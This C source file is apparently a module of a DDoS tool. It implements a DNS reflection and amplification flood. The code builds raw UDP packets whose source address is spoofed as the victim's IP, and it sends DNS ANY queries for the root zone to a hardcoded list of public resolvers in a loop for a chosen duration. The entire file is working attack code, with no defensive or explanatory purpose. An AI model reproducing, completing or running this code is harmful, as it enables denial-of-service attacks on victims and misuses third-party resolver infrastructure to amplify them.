#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>

#include "attack.h"

// DNS Root Query (.) TYPE ANY
// Header: ID(2), Flags(2), QCount(2), ACount(2), Auth(2), Add(2)
// Query: Length(1), Name(1), Null(1), Type(2), Class(2)
static const uint8_t dns_payload_root[] = {
    0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00,       // Root
    0x00, 0xff, // ANY
    0x00, 0x01  // IN
};

// Open Resolvers
static const char *resolvers[] = {
    "8.8.8.8",      // Google
    "8.8.4.4",      // Google
    "1.1.1.1",      // Cloudflare
    "1.0.0.1",      // Cloudflare
    "9.9.9.9",      // Quad9
    "208.67.222.222", // OpenDNS
    "208.67.220.220", // OpenDNS
    "4.2.2.1",      // Level3
    "4.2.2.2"       // Level3
};

void attack_dns(uint32_t victim_ip, uint16_t victim_port, uint32_t duration) {
    (void)victim_port; 

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char packet[1024];
    struct ip *iph = (struct ip *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct ip));

    time_t end_time = time(NULL) + duration;
    int num_resolvers = sizeof(resolvers) / sizeof(char*);

    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + sizeof(dns_payload_root);
    iph->ip_id = htonl(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_UDP;
    
    // SPOOF SOURCE AS VICTIM
    iph->ip_src.s_addr = victim_ip; 

    struct sockaddr_in current_resolver;
    current_resolver.sin_family = AF_INET;
    current_resolver.sin_port = htons(53); 

    while (time(NULL) < end_time) {
        for (int i = 0; i < num_resolvers; i++) {
            current_resolver.sin_addr.s_addr = inet_addr(resolvers[i]);
            iph->ip_dst.s_addr = current_resolver.sin_addr.s_addr;

            iph->ip_id = htonl(fast_rand() & 0xFFFF);
            iph->ip_sum = 0; 
            iph->ip_sum = csum((unsigned short *)packet, sizeof(struct ip));

            udph->uh_sport = htons(fast_rand() & 0xFFFF);
            udph->uh_dport = htons(53);
            udph->uh_ulen = htons(sizeof(struct udphdr) + sizeof(dns_payload_root));
            udph->uh_sum = 0; 

            uint8_t *data = (uint8_t *)(packet + sizeof(struct ip) + sizeof(struct udphdr));
            memcpy(data, dns_payload_root, sizeof(dns_payload_root));
            
            // Randomize Transaction ID (First 2 bytes of DNS Payload)
            uint16_t tx_id = fast_rand() & 0xFFFF;
            data[0] = (tx_id >> 8) & 0xFF;
            data[1] = tx_id & 0xFF;

            sendto(sock, packet, iph->ip_len, 0, (struct sockaddr *)&current_resolver, sizeof(current_resolver));
        }
    }
    close(sock);
}
